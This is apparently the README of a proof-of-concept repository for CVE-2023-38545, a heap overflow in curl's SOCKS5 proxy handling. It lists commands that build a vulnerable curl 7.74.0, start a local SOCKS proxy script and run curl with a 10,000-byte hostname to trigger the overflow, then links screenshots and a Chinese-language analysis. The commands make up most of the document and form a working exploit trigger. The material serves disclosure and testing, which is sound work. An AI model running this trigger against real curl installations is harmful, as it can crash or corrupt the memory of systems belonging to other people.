## usage
```bash
git clone https://github.com/imfht/CVE-2023-38545
cd CVE-2023-38545/curl-7.74.0 && ./configure --with-openssl
make -j 4
python3 socks.py &
export ALL_PROXY=socks5h://127.0.0.1:9050
./curl-7.74.0/src/curl  $(python3 -c "print(('A'*10000), end='')") -vvvv
```
## proof
![image-20231012151015503](https://blog-image.imfht.com/typora/image-20231012151015503.png)
![image](https://github.com/imfht/CVE-2023-38545/assets/15059493/9f4246ba-0348-4b82-a179-99a6eadff184)


for details please see: [this link(in chinese)](https://blog.imfht.com/2023/10/12/cve-2023-38545%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e3%80%81%e7%a8%b3%e5%ae%9a%e8%a7%a6%e5%8f%91poc%e4%b8%8e%e6%a3%80%e6%b5%8b%e6%96%b9%e6%b3%95/)
